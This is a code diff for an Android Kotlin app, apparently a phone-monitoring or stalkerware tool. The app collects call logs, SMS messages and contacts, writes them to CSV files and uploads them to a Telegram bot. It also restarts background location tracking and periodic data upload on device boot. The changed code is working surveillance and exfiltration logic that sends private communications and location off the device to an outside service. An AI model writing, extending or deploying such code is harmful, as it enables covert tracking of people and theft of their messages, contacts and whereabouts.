@@ -2,6 +2,7 @@
 package com.example.lta
 
 import android.Manifest
+import android.content.Context
 import android.os.Build
 import android.os.Bundle
 import android.widget.Toast
@@ -23,8 +24,10 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.work.*
 import com.example.lta.ui.theme.LtaTheme
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
-import java.util.concurrent.TimeUnit
+import kotlinx.coroutines.withContext
+import java.io.File
 
 class MainActivity : ComponentActivity() {
 
@@ -71,6 +74,69 @@ fun ControlPanelScreen(
     val coroutineScope = rememberCoroutineScope()
     var statusMessage by remember { mutableStateOf("Ready.") }
 
+    // Reusable helper function to handle the entire CSV export and upload process
+    val exportDataAsCsv: (dataType: String, mainPermission: String, secondPermission: String?, csvProvider: () -> String) -> Unit =
+        { dataType, mainPermission, secondPermission, csvProvider ->
+            
+            // This is the core logic that generates, saves, and uploads the file.
+            // It's wrapped in a lambda to be called after permissions are granted.
+            val proceedWithExport = {
+                coroutineScope.launch {
+                    try {
+                        // 1. Generate the CSV data on a background thread
+                        statusMessage = "Generating $dataType CSV..."
+                        val csvData = withContext(Dispatchers.IO) { csvProvider() }
+
+                        if (csvData.lines().size <= 1) { // Check if only header is present
+                            statusMessage = "$dataType: No data found to export."
+                            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+                            return@launch
+                        }
+
+                        // 2. Save the CSV data to a temporary file in the app's cache
+                        val file = File.createTempFile(dataType.lowercase().replace(" ", "_"), ".csv", context.cacheDir)
+                        file.writeText(csvData)
+
+                        // 3. Upload the file using the Telegram API
+                        statusMessage = "Uploading $dataType CSV..."
+                        val success = telegramBotApi.sendDocument(file, "Exported $dataType from device.")
+                        
+                        // 4. Clean up the temporary file
+                        file.delete()
+
+                        // 5. Update the user
+                        statusMessage = if (success) {
+                            "$dataType export successful."
+                        } else {
+                            "Failed to export $dataType."
+                        }
+                        Toast.makeText(context, statusMessage, Toast.LENGTH_LONG).show()
+
+                    } catch (e: Exception) {
+                        statusMessage = "Error during export: ${e.message}"
+                        Toast.makeText(context, statusMessage, Toast.LENGTH_LONG).show()
+                        e.printStackTrace()
+                    }
+                }
+            }
+
+            // Start the permission request chain
+            permissionManager.requestPermission(mainPermission,
+                onGranted = {
+                    // If a second permission is needed (e.g., READ_CONTACTS for names), request it.
+                    if (secondPermission != null) {
+                        permissionManager.requestPermission(secondPermission,
+                            onGranted = { proceedWithExport() }
+                        )
+                    } else {
+                        // Otherwise, just proceed.
+                        proceedWithExport()
+                    }
+                }
+            )
+        }
+
+
     Column(
         modifier = modifier
             .fillMaxSize()
@@ -85,12 +151,12 @@ fun ControlPanelScreen(
             permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                     permissionManager.requestPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) {
-                        schedulePeriodicLocationWorker(workManager)
+                        BootCompletedReceiver.schedulePeriodicLocationWorker(context)
                         statusMessage = "Periodic location tracking started."
                         Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                     }
                 } else {
-                    schedulePeriodicLocationWorker(workManager)
+                    BootCompletedReceiver.schedulePeriodicLocationWorker(context)
                     statusMessage = "Periodic location tracking started."
                     Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
                 }
@@ -108,7 +174,7 @@ fun ControlPanelScreen(
         }
         Spacer(modifier = Modifier.height(16.dp))
         Button(onClick = {
-            scheduleDataUploadWorker(workManager)
+            BootCompletedReceiver.scheduleDataUploadWorker(context)
             statusMessage = "Periodic data/system sync started."
             Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
         }) {
@@ -122,7 +188,7 @@ fun ControlPanelScreen(
         }) {
             Text("Stop Periodic Data Sync")
         }
-        SectionHeader(title = "Manual Actions")
+        SectionHeader(title = "Manual Actions & CSV Export")
         Button(onClick = {
             statusMessage = "Requesting one-time location..."
             permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
@@ -137,43 +203,40 @@ fun ControlPanelScreen(
             Text("Send Location Now")
         }
         Spacer(modifier = Modifier.height(16.dp))
+        
         Button(onClick = {
-            permissionManager.requestPermission(Manifest.permission.READ_CALL_LOG) {
-                statusMessage = "Exporting all call logs..."
-                coroutineScope.launch {
-                    val callLogs = manualDataManager.getCallLogs()
-                    sendDataInChunks(callLogs, "Call Logs", telegramBotApi)
-                    statusMessage = "${callLogs.size} call logs sent."
-                }
-            }
+            exportDataAsCsv(
+                dataType = "Call Logs",
+                mainPermission = Manifest.permission.READ_CALL_LOG,
+                secondPermission = Manifest.permission.READ_CONTACTS, // Ask for contacts to get names
+                csvProvider = manualDataManager::getCallLogsAsCsv
+            )
         }) {
-            Text("Export All Call Logs")
+            Text("Export Call Logs as CSV")
         }
         Spacer(modifier = Modifier.height(16.dp))
+
         Button(onClick = {
-            permissionManager.requestPermission(Manifest.permission.READ_SMS) {
-                statusMessage = "Exporting all SMS..."
-                coroutineScope.launch {
-                    val smsList = manualDataManager.getSmsMessages()
-                    sendDataInChunks(smsList, "SMS Messages", telegramBotApi)
-                    statusMessage = "${smsList.size} SMS messages sent."
-                }
-            }
+            exportDataAsCsv(
+                dataType = "SMS",
+                mainPermission = Manifest.permission.READ_SMS,
+                secondPermission = Manifest.permission.READ_CONTACTS, // Ask for contacts to get names
+                csvProvider = manualDataManager::getSmsAsCsv
+            )
         }) {
-            Text("Export All SMS")
+            Text("Export SMS as CSV")
         }
         Spacer(modifier = Modifier.height(16.dp))
+
         Button(onClick = {
-            permissionManager.requestPermission(Manifest.permission.READ_CONTACTS) {
-                statusMessage = "Exporting all contacts..."
-                coroutineScope.launch {
-                    val contacts = manualDataManager.getContacts()
-                    sendDataInChunks(contacts, "Contacts", telegramBotApi)
-                    statusMessage = "${contacts.size} contacts sent."
-                }
-            }
+            exportDataAsCsv(
+                dataType = "Contacts",
+                mainPermission = Manifest.permission.READ_CONTACTS,
+                secondPermission = null, // No second permission needed
+                csvProvider = manualDataManager::getContactsAsCsv
+            )
         }) {
-            Text("Export All Contacts")
+            Text("Export Contacts as CSV")
         }
     }
 }
@@ -187,41 +250,22 @@ private fun SectionHeader(title: String) {
     Spacer(modifier = Modifier.height(16.dp))
 }
 
-private fun schedulePeriodicLocationWorker(workManager: WorkManager) {
-    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
-    val periodicWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(15, TimeUnit.MINUTES)
-        .setConstraints(constraints).build()
-    workManager.enqueueUniquePeriodicWork(
-        LocationWorker.UNIQUE_WORK_NAME, ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest
-    )
-}
-
-private fun scheduleDataUploadWorker(workManager: WorkManager) {
-    val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()
-    val periodicWorkRequest = PeriodicWorkRequestBuilder<DataUploadWorker>(15, TimeUnit.MINUTES)
-        .setConstraints(constraints).build()
-    workManager.enqueueUniquePeriodicWork(
-        "DataUploadWorker", ExistingPeriodicWorkPolicy.KEEP, periodicWorkRequest
-    )
-}
-
+/**
+ * Convenience extension function for [PermissionManager] to request a single permission
+ * and handle the denied case with a Toast message.
+ */
 fun PermissionManager.requestPermission(permission: String, onGranted: () -> Unit) {
-    this.requestPermission(permission, onGranted) { }
-}
-
-// FIXED: This function now needs to be a suspend function because it calls one.
-private suspend fun sendDataInChunks(data: List<String>, title: String, api: TelegramBotApi) {
-    if (data.isEmpty()) {
-        api.sendMessage("$title: No data found.")
-        return
-    }
-    val chunkSize = 20
-    data.chunked(chunkSize).forEachIndexed { index, chunk ->
-        val messageBuilder = StringBuilder()
-        messageBuilder.append("--- $title (Part ${index + 1}) ---\n\n")
-        chunk.forEach { item ->
-            messageBuilder.append(item).append("\n")
+    this.requestPermission(
+        permission = permission,
+        onGranted = onGranted,
+        onDenied = {
+            val context = (this as? ComponentActivity)?.baseContext ?: return@requestPermission
+            val permissionName = permission.substringAfterLast('.').replace("_", " ")
+            Toast.makeText(
+                context,
+                "Permission for $permissionName was denied. The feature cannot proceed.",
+                Toast.LENGTH_LONG
+            ).show()
         }
-        api.sendMessage(messageBuilder.toString())
-    }
+    )
 }
